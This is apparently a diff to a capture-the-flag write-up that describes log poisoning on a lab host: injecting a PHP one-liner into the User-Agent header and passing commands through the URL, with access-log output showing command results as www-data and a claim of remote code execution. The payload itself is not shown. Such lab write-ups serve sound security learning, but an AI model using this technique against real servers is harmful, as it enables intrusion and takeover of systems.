@@ -175,5 +175,22 @@ So to do this ill inject a PHP one liner into the user agent field of the reques
 
 Ill add the PHP one liner in the user agent
 
-Then add the command i wa
+Then add the command i want to execute via the URL
+
+```python
+<h4>Log Contents</h4>
+<pre style="max-height: 400px; overflow-y: auto;">10.10.14.90 - - [20/Apr/2026:16:15:14 +0000] &quot;POST /dashboard.php HTTP/1.1&quot; 200 1132 &quot;http://reset.vl/dashboard.php&quot; &quot;uid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm)
+&quot;
+10.10.14.90 - - [20/Apr/2026:16:15:17 +0000] &quot;POST /dashboard.php HTTP/1.1&quot; 500 415 &quot;http://reset.vl/dashboard.php&quot; &quot;uid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm)
+&quot;
+10.10.14.90 - - [20/Apr/2026:16:15:23 +0000] &quot;POST /dashboard.php HTTP/1.1&quot; 500 415 &quot;http://reset.vl/dashboard.php&quot; &quot;uid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm)
+&quot;
+10.10.14.90 - - [20/Apr/2026:16:15:24 +0000] &quot;POST /dashboard.php HTTP/1.1&quot; 500 415 &quot;http://reset.vl/dashboard.php&quot; &quot;uid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm)
+&quot;
+10.10.14.90 - - [20/Apr/2026:16:15:25 +0000] &quot;POST /dashboard.php HTTP/1.1&quot; 500 415 &quot;http://reset.vl/dashboard.php&quot; &quot;uid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm)
+&quot;
+</pre>
+```
+As seen at the end of the output i have remote code execution!!
+
 
